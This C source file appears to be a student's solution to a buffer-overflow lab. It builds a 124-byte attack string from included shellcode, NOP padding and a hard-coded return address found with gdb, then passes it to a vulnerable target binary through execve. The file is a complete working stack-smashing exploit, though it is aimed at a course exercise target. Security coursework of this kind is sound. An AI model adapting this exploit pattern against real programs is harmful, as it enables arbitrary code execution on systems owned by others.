#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"
#define RETURN_ADDRESS "\x50\xfe\x21\x30"
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];


	// Start My Code
    char attack[125] = {0};

    // Copy the shellcode into the attack buffer
    memcpy(attack, shellcode, 45);

    // Fill the buffer with NOPs after the shellcode
    memset(attack + 45, 0x90, 75);  // Filling from position 45 to 119 with NOPs

    // Overwrite the return address (from the gdb breakpoint)
    char *buf_address = "\x50\xfe\x21\x30";  
    memcpy(attack + 120, buf_address, 4);    // Copying 4 bytes of return address into the buffer


	// End Attacking


	args[0] = TARGET;
	args[1] = attack;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
